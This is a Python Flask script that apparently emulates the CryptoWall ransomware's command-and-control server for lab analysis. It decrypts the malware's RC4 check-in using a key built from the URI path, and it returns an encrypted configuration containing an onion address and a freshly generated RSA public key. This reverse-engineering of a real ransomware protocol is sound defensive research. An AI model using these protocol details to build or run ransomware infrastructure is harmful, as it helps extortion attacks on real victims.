# py -m pip install flask pyopenssl pycryptodome
# Place in your /etc/hosts 127.0.0.1 proxy1-1-1.i2p
# Place in your /etc/hosts 127.0.0.1 proxy2-2-2.i2p
from flask import Flask, escape, request
from Crypto.Cipher import ARC4
from Crypto.PublicKey import RSA
import string
import random
import binascii


app = Flask(__name__)


def ByteSwapURIPathString(uri_path):
    uri_path_arr = list(uri_path)
    tmp = ''
    n, z = len(uri_path_arr), len(uri_path_arr)
    while(n):
        n -= 1
        for i in range(n):
            if(ord(uri_path_arr[i]) >= ord(uri_path_arr[(i+1)%z])):
                tmp = uri_path_arr[(i+1)%z]
                uri_path_arr[(i+1)%z] = uri_path_arr[i]
                uri_path_arr[i] = tmp

    return ''.join(uri_path_arr)


def GenerateUniqueID():
    random_str = ''.join([random.choice(string.ascii_letters + string.digits) for n in range(4)])
    return random_str


def EncryptC2ResponseBackToMalware(plaintext_key):
    key = RSA.generate(2048)
    pub_key = key.publickey().exportKey('PEM')
    priv_key = key.exportKey('PEM')

    uniqueID = GenerateUniqueID()
    f = open('%s_key' % uniqueID, 'wb')
    f.write(priv_key)
    f.write(pub_key)
    f.close()

    # onion route should be retrieved from tor_site_checksum_finder.py
    c2_dict = b'{216|1pai7ycr7jxqkilp.onion|%b|US|%b}' % (uniqueID.encode(), pub_key)
    rc4_key = ARC4.new(plaintext_key)
    encrypted_data = rc4_key.encrypt(c2_dict)

    print("\n[+] Sending encrypted data blob back to cryptowall process")
    return binascii.hexlify(encrypted_data)


# Path is always a random generated string, so we have to wildcard the route
@app.route('/<path:text>', methods=['GET', 'POST'])
def setup(text):
    print("Data Received from CryptoWall Binary:")
    print("-"*30)

    plaintext_key = ByteSwapURIPathString(text)
    rc4_data = dict(request.form)
    for val in rc4_data:
        ciphertext = rc4_data[val] # some py versions, value comes back in an array

    print("[!] Found URI Header: {}".format(text))
    print("[+] Created key from URI: {}".format(plaintext_key))
    print("[!] Found ciphertext: {}".format(ciphertext))

    rc4_key = ARC4.new(plaintext_key.encode())
    plaintext = rc4_key.decrypt(bytes.fromhex(ciphertext))
    print("[+] Recovered plaintext: {}".format(plaintext))

    return EncryptC2ResponseBackToMalware(plaintext_key.encode()), 200


if __name__ == "__main__":
    # test function works by using an example string generated from cryptowall
    assert(ByteSwapURIPathString("tfuzxqh6wf7mng") == "67ffghmnqtuwxz")
    app.run(port=80)
